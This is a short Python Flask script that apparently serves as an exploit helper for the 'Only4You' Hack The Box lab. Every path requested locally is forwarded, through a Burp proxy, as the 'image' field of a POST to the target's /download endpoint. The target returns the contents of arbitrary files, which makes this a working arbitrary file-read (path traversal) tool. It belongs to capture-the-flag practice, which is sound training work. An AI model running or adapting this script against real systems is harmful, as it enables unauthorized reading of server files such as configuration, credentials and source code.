#!/usr/bin/python3

from flask import Flask
import requests


burp = {"http": "http://127.0.0.1:8080"}
app = Flask(__name__)


@app.route('/<path:path>')
def index(path):

    burp0_url = "http://beta.only4you.htb:80/download"
    burp0_headers = {"User-Agent": "curl/7.88.1", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
    path = "/" + path
    burp0_data = {"image": path}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=burp)
    response = r.text
    return response

if __name__ == '__main__':
    app.run()
